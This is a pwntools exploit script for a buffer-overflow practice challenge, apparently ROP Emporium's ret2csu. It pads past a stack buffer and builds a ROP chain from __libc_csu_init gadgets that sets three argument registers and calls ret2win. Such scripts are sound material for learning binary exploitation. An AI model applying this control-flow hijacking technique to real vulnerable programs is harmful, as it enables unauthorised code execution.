from pwn import *

binary = args.BIN

context.terminal = ["tmux", "splitw", "-h"]
e = context.binary = ELF(binary)
r = ROP(e)
lib = ELF('./libret2csu.so')
gs = '''
continue
'''

def start():
    if args.GDB:
        return gdb.debug(e.path, gdbscript=gs)
    else:
        return process(e.path)

p = start()

#x = cyclic(500)
#p.sendline(x)

padding = b'A' * 40
chain = padding

arg_1 = 0xdeadbeefdeadbeef
arg_2 = 0xcafebabecafebabe
arg_3 = 0xd00df00dd00df00d

chain += p64(0x40069a) # gadget1
# want the cmp %rbx,%rbp to be false
chain += p64(0x0) # rbx = 0
chain += p64(0x1) # rbp = 1
chain += p64(0x600e38) # pointer to _init
chain += p64(arg_1) # r13 -> rdi in gadget2
chain += p64(arg_2) # r14 -> rsi in gadget2
chain += p64(arg_3) # r15 -> rdx in gadget2
chain += p64(0x400680) # gadget2
chain += p64(0x0) # add rsp, 0x8
chain += p64(0x0)   # rbx = 0
chain += p64(0x0) # rbp = 0
chain += p64(0x0) # r12 = 0
chain += p64(0x0) # r13 = 0
chain += p64(0x0) # r14 = 0
chain += p64(0x0) # r15 = 0
chain += p64(0x4006a3) # pop rdi; ret;
chain += p64(arg_1) # only half copied over originally
chain += p64(0x400510) # address to ret2win@plt

p.recvuntil(">")
p.sendline(chain)

response = p.recvall().decode()
print(response)

p.interactive()

